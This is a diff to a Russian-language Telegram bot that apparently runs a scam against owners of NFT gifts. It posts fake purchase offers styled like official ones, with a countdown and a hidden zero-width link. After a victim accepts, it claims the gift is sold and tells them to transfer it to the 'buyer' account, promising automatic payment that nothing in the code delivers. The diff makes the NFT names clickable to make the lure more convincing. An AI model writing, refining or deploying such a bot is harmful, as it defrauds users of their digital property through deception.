@@ -57,13 +57,12 @@ async def send_offer(message: Message):
     if currency_raw not in ["stars", "ton", "gram"]:
         return
 
-    # Красивое написание валюты
     if currency_raw == "stars":
         currency_display = "⭐ Stars"
     elif currency_raw == "ton":
         currency_display = "TON"
     else:
-        currency_display = "Gram"  # <--- ТЕПЕРЬ С БОЛЬШОЙ БУКВЫ
+        currency_display = "Gram"
 
     nft_slug = link.rstrip("/").split("/")[-1]
     nft_prefix, separator, nft_number = nft_slug.rpartition("-")
@@ -78,7 +77,6 @@ async def send_offer(message: Message):
     nft_link = f'<a href="{link}">{nft_name}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
-    # УБРАЛ ПЕРЕНОС СТРОКИ ПОСЛЕ "ВАМ", ЧТОБЫ НЕ БЫЛО СМЕЩЕНИЯ
     offer_text = (
         f"<b>Пользователь {sender_display} предлагает Вам {amount} {currency_display} за подарок {nft_link}.</b>\n\n"
         f"<b>Предложение действует ещё 5ч 59м.</b>\n"
@@ -130,11 +128,13 @@ async def on_accept_offer(callback: CallbackQuery):
     conn_id = last_offer_data.get("business_connection_id")
     sender_username = last_offer_data.get("sender_username")
 
+    # Делаем NFT кликабельным в тексте "успешно продан"
+    nft_link = f'<a href="{link}">{nft_name}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
     target_account = f"@{sender_username}" if sender_username else "покупателю"
 
     new_text = (
-        f"<b>Подарок: {nft_name} успешно продан!</b>\n\n"
+        f"<b>Подарок: {nft_link} успешно продан!</b>\n\n"
         f"<b>Перевод средств инициирован.</b>\n"
         f"<b>Пожалуйста, передайте указанный NFT-подарок напрямую на аккаунт покупателя {target_account} для завершения транзакции.</b>\n\n"
         f"<b>После подтверждения передачи, средства будут зачислены на ваш баланс автоматически.</b>\n"
@@ -180,13 +180,15 @@ async def on_send_transfer(callback: CallbackQuery):
     conn_id = last_offer_data.get("business_connection_id")
     sender_username = last_offer_data.get("sender_username")
 
+    # Делаем NFT кликабельным в инструкции
+    nft_link = f'<a href="{link}">{nft_name}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
     target_account = f"@{sender_username}" if sender_username else "покупателю"
 
     instruction_text = (
         f"<b>Инструкция по передаче подарка</b>\n\n"
         f"<b>1.</b> Откройте Профиль -> Подарки в Telegram.\n"
-        f"<b>2.</b> Выберите <b>{nft_name}</b> в своём списке.\n"
+        f"<b>2.</b> Выберите {nft_link} в своём списке.\n"
         f"<b>3.</b> Нажмите «Передать», затем укажите получателя <b>{target_account}</b>.\n"
         f"<b>4.</b> Проверьте данные и подтвердите отправку.\n\n"
         f"<b>Автоматическое завершение сделки</b>\n"
@@ -231,11 +233,12 @@ async def back_from_instruction(callback: CallbackQuery):
     conn_id = last_offer_data.get("business_connection_id")
     sender_username = last_offer_data.get("sender_username")
 
+    nft_link = f'<a href="{link}">{nft_name}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
     target_account = f"@{sender_username}" if sender_username else "покупателю"
 
     back_text = (
-        f"<b>Подарок: {nft_name} успешно продан!</b>\n\n"
+        f"<b>Подарок: {nft_link} успешно продан!</b>\n\n"
         f"<b>Перевод средств инициирован.</b>\n"
         f"<b>Пожалуйста, передайте указанный NFT-подарок напрямую на аккаунт покупателя {target_account} для завершения транзакции.</b>\n\n"
         f"<b>После подтверждения передачи, средства будут зачислены на ваш баланс автоматически.</b>\n"
@@ -281,10 +284,9 @@ async def on_confirm_transfer(callback: CallbackQuery):
     )
     await callback.answer(alert_text, show_alert=True)
 
-# --- ОБРАБОТЧИК "ОТКЛОНИТЬ" (УДАЛЯЕТ СООБЩЕНИЕ) ---
+# --- ОБРАБОТЧИК "ОТКЛОНИТЬ" ---
 @dispatcher.callback_query(F.data == "decline")
 async def on_decline(callback: CallbackQuery):
-    # Удаляем сообщение с офером
     try:
         await callback.bot.delete_message(
             chat_id=callback.message.chat.id,
